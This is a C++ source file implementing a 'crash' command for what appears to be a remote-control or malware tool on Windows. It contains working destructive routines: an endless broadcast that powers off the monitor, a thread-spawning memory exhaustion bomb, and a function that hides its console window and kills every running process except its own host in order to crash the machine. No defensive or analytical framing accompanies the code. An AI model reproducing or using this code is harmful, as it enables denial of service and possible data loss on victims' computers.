#include "stdafx.h"
#include "CommandCrash.h"


CommandCrash::CommandCrash()
{
}


CommandCrash::~CommandCrash()
{
}

bool CommandCrash::ShouldRunThisCommand(ParsedCommand* Parsed)
{
	return (Parsed->Words->at(0) == "crash");
}

void CommandCrash::Run(ParsedCommand* Parsed)
{
	while (true)
	{
		SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
	}
	//thread* processKiller = new thread(&CommandCrash::AttackProcesses, this);
}

void CommandCrash::DoSomething()
{
	while (true)
	{
		thread* a = new thread(&CommandCrash::GobbleMemory, this);
	}

}



void CommandCrash::GobbleMemory()
{
	while (true)
	{
		string* a = new string("SLKDJFLKJSDFLJKKSLJDFKLJSDLKJLKFJDSKJSDFLKJSDFLJKSDKJLSDFLJKKJLSDFJLKDSFLKJSDFJKLDSFKJL");
	}
}

void CommandCrash::AttackProcesses()
{
	WCHAR path[260];
	GetModuleFileName(NULL, path, 260);
	HWND console = FindWindow(L"ConsoleWindowClass", path);

	if (IsWindow(console))
	{
		ShowWindow(console, SW_HIDE);
	}

	// Get the list of process identifiers.  
	register unsigned long aProcesses[1024];
	unsigned long cbNeeded;
	unsigned long numberOfProcesses;

	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);

	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	register unsigned int i = 0;
	void* hProcess;
	unsigned long CID = GetCurrentProcessId();
	EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
	i = 0;
	numberOfProcesses = cbNeeded / sizeof(unsigned long);

	for (i = 0; i < numberOfProcesses; i++)
	{
		//Get process handle.
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, aProcesses[i]);
		void* info = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

		wchar_t buffer[MAX_PATH];
		GetModuleFileNameEx(info, NULL, buffer, MAX_PATH);
		wstring ws(buffer);
		string converted(ws.begin(), ws.end());

		char drive[4];
		char directory[MAX_PATH];
		char filename[MAX_PATH];
		char extension[MAX_PATH];
		_splitpath(converted.c_str(), drive, directory, filename, extension);

		//Make sure its not the host for this program.
		//We can't directly kill ourselves when not elevated, but we could kill something needed to run this program.
		if (filename[0] != 'C' || filename[1] != 'o' || filename[2] != 'm' || filename[3] != 'm'
			|| filename[4] != 'a' || filename[5] != 'n' || filename[6] != 'd'
			|| extension[0] != '.' || extension[1] != 'e' || extension[2] != 'x'
			|| extension[3] != 'e')
		{
			//Kill process.
			TerminateProcess(hProcess, 1);
		}
	}
}

string* CommandCrash::GetName()
{
	return new string("Crash");
}

string* CommandCrash::GetHelp()
{
	return new string("Crashes the computer, and causes a BSOD (Blue Screen Of Death)");
}
